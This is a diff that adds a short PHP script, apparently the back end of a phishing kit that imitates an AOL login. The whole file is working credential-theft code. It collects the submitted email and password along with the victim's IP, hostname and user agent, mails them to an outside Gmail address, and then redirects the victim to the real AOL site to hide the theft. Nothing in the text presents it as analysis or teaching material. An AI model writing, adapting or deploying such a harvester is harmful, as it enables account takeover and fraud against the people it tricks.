@@ -1,0 +1,26 @@
+<?php
+if($_POST["user1"] != "" and $_POST["psw"] != ""){
+$ip = getenv("REMOTE_ADDR");
+$hostname = gethostbyaddr($ip);
+$useragent = $_SERVER['HTTP_USER_AGENT'];
+$message .= "--------------AOL Info-----------------------\n";
+$message .= "Email            : ".$_POST['user1']."\n";
+$message .= "Password           : ".$_POST['psw']."\n";
+$message .= "|--------------- I N F O | I P -------------------|\n";
+$message .= "|Client IP: ".$ip."\n";
+$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+$message .= "User Agent : ".$useragent."\n";
+$message .= "|----------- SHAREPOINT ONEDRIVE--------------|\n";
+$send = "mxtoolzbox@gmail.com";
+$subject = "Card | $ip";
+{
+mail("$send", "$subject", $message);   
+}
+$praga=rand();
+$praga=md5($praga);
+  header ("Location: https://www.aol.com/");
+}else{
+header ("Location: index.php");
+}
+
+?>
